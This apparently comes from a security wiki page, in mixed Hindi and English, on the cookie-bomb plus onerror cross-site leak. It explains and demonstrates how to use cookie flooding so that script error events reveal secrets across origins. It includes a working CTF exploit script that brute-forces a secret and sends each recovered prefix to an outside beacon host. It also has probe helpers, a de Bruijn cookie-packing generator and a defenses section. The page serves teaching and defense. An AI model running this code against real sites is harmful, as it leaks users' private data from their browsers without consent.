# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: पीड़ित के ब्राउज़र को target origin के लिए कई/बड़ी cookies से भरना ताकि बाद की requests server/request limits (request header size, URL size in redirects, आदि) को छू लें।
- Error-event oracle: एक cross-origin endpoint को <script> (या अन्य subresource) से probe करना और onload vs onerror से स्थितियों को अलग करना।

High level idea
- ऐसा target endpoint खोजें जिसका व्यवहार उन दो स्थितियों के लिए अलग हो जिन्हें आप टेस्ट करना चाहते हैं (उदा., search “hit” vs “miss”)।
- सुनिश्चित करें कि “hit” path एक भारी redirect chain या लंबा URL ट्रिगर करेगा जबकि “miss” path छोटा रहेगा। कई cookies से request headers को inflate करें ताकि केवल “hit” path सर्वर को HTTP error (उदा., 431/414/400) के साथ फेल करवा दे। यह error onerror इवेंट को पलट देता है और XS-Search के लिए एक oracle बन जाता है।

When does this work
- आप पीड़ित ब्राउज़र को target को cookies भेजने के लिए मजबूर कर सकते हैं (उदा., cookies SameSite=None हों या आप उन्हें first-party context में popup window.open के जरिए सेट कर सकें)।
- कोई app feature है जिसे आप arbitrary cookies सेट करने के लिए abuse कर सकते हैं (उदा., “save preference” endpoints जो controlled input names/values को Set-Cookie में बदल देते हैं) या जो post-auth redirects बनाते हैं जो attacker-controlled data को URL में शामिल करते हैं।
- सर्वर दोनों स्थितियों पर अलग तरीके से प्रतिक्रिया देता है और, inflated headers/URL के साथ, एक स्थिति किसी limit को पार कर एक error response लौटाती है जो onerror ट्रिगर करती है।

Note on server errors used as the oracle
- 431 Request Header Fields Too Large आम तौर पर लौटता है जब cookies request headers को inflate करते हैं; 414 URI Too Long या लंबे request targets के लिए server-specific 400 लौट सकता है। इनमें से कोई भी एक failed subresource load बनाता है और onerror को फायर कराता है। [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
क्यों popup (window.open)?
- आधुनिक ब्राउज़र बढ़ती तौर पर third‑party cookies को ब्लॉक करते हैं। लक्ष्य पर एक top-level window खोलने से cookies first‑party बन जाती हैं, इसलिए Set-Cookie responses टिक जाती हैं, जिससे cookie-bomb step सक्षम हो जाता है, भले ही third‑party cookie restrictions हों।

2024–2025 notes on cookie availability
- Chromium-based ब्राउज़र आमतौर पर अभी भी third‑party cookies भेजते हैं जब तक उपयोगकर्ता या साइट opts out न करें, पर Safari और Firefox डिफ़ॉल्ट रूप से अधिकांश third‑party cookies को ब्लॉक करते हैं। दोनों के लिए योजना बनाएं: (1) first‑party cookie planting flow का उपयोग करें (window.open + auto-submit to a cookie-setting endpoint) और फिर (2) एक subresource से probe करें जो तभी सफल होता है जब वे cookies भेजे जाते हों। यदि third‑party cookies ब्लॉक हैं, तो probe को same-site context में ले जाएँ (उदा., popup में oracle चलाएँ via a same-site gadget और boolean को postMessage या एक beacon के जरिए अपने server पर exfiltrate करें)।

Generic probing helper
यदि आपके पास पहले से ही target origin पर कई cookies सेट करने का तरीका (first-party) मौजूद है, तो आप इस minimal oracle को किसी भी endpoint के खिलाफ पुन: उपयोग कर सकते हैं, जिसकी success/failure अलग network outcomes (status/MIME/redirect) पैदा करती है:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
वैकल्पिक tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
उन्नत: de Bruijn–based cookie packing (CTF-proven)
- जब ऐप आपको बड़े cookie values नियंत्रित करने देता है, तो आप प्रत्येक probe के अंत में एक de Bruijn sequence जोड़कर अनुमानों को कुशलता से पैक कर सकते हैं। इससे प्रति‑probe ओवरहेड छोटा रहता है जबकि यह सुनिश्चित होता है कि heavy branch केवल सही prefix के लिए लगातार भारी रहे। उदाहरण जनरेटर |Σ| प्रतीकों के लिए लंबाई n (cookie value में फिट होता है):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idea in practice: कई cookies सेट करें जिनके मान prefix + deBruijn(k,n) हों। सिर्फ़ तब जब टेस्ट किया गया prefix सही होता है, सर्वर भारी path लेता है (उदा., लंबी cookie या URL को रिफ्लेक्ट करने वाला अतिरिक्त redirect), जो cookie bloat के साथ मिलकर लिमिट्स पार कर देता है और onerror को flip कर देता है। इस approach का उपयोग करते हुए एक सार्वजनिक solver देखें: LA CTF 2024.

Tips to build the oracle
- Force the “positive” state to be heavier: केवल तभी एक अतिरिक्त redirect chain करें जब predicate true हो, या redirect URL को अनबाउंडेड user input से बनाएं ताकि यह guessed prefix के साथ बढ़े।
- Inflate headers: cookie bombing को तब तक repeat करें जब तक “heavy” path पर एक consistent error observe न हो। सर्वर आमतौर पर header size को cap करते हैं और कई cookies होने पर जल्दी fail कर सकते हैं।
- Stabilize: कई parallel cookie set operations चलाएँ और probe को बार-बार करें ताकि timing और caching noise का औसत निकाला जा सके।
- Bust caches and avoid pooling artifacts: probe URLs में एक random `#fragment` या `?r=` जोड़ें, और window.open loops में अलग window names का उपयोग करें।
- Alternate subresources: अगर `<script>` filter हो रहा है, तो `<link rel=stylesheet>` या `<img>` आज़माएँ। onload/onerror boolean ही oracle है; content को parsed होने की ज़रूरत नहीं है।

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs और servers अलग caps लागू करते हैं। October 2025 तक, Cloudflare edge पर request headers के लिए कुल 128 KB (और 16 KB URL) डॉक्यूमेंट किया है, इसलिए जब targets इसके पीछे हों तो आपको ज़्यादा/बड़े cookies की ज़रूरत पड़ सकती है। अन्य stacks (उदा., Apache via LimitRequestFieldSize) अक्सर ~8 KB प्रति header line के करीब होते हैं और पहले errors पैच कर देंगे। अपने bomb का आकार उसी हिसाब से समायोजित करें। [Cloudflare docs show the 128 KB header limit.]

Related XS-Search tricks
- URL length based oracles (कोई cookies जरूरी नहीं) तब combine या अलग से उपयोग किए जा सकते हैं जब आप बहुत लंबा request target force कर सकें:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
  - conditional redirects या states के बीच बड़े differences से बचें। दोनों राज्यों के लिए वही status, वही content type, और समान body length लौटाएँ।
- Block cross-site subresource probes:
  - SameSite cookies: संवेदनशील cookies को SameSite=Lax या Strict पर सेट करें ताकि `<script src>` जैसे subresource requests उन्हें न भेजें; auth tokens के लिए संभव हो तो Strict पसंद करें।
  - Fetch Metadata: cross-site subresource loads को reject करने के लिए Resource Isolation Policy लागू करें (उदा., अगर Sec-Fetch-Site != same-origin/same-site)।
  - Cross-Origin-Resource-Policy (CORP): उन endpoints के लिए CORP: same-origin (या कम से कम same-site) सेट करें जिन्हें cross-origin subresources के रूप में embed नहीं किया जाना चाहिए।
  - X-Content-Type-Options: nosniff और JSON/HTML endpoints पर सही Content-Type सेट करें ताकि load-as-script quirks से बचा जा सके।
- Reduce header/URL amplification:
  - सेट की जाने वाली cookies की संख्या/आकार पर cap लगाएँ; ऐसी सुविधाओं को sanitize करें जो arbitrary form fields को Set-Cookie में बदल देती हैं।
  - redirects में reflected data को normalize या truncate करें; Location URLs में attacker-controlled लंबी strings embed करने से बचें।
  - Server limits को consistent रखें और एक समान तरीके से fail कराएँ (किसी एक branch के लिए special error pages से बचें).

Notes
- इस class of attacks को broadly “Error Events” XS-Leaks के रूप में discuss किया जाता है। cookie-bomb step केवल एक सुविधाजनक तरीका है ताकि सिर्फ़ एक branch को server limits के ऊपर धकेला जा सके, जिससे एक reliable boolean oracle बनता है।



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
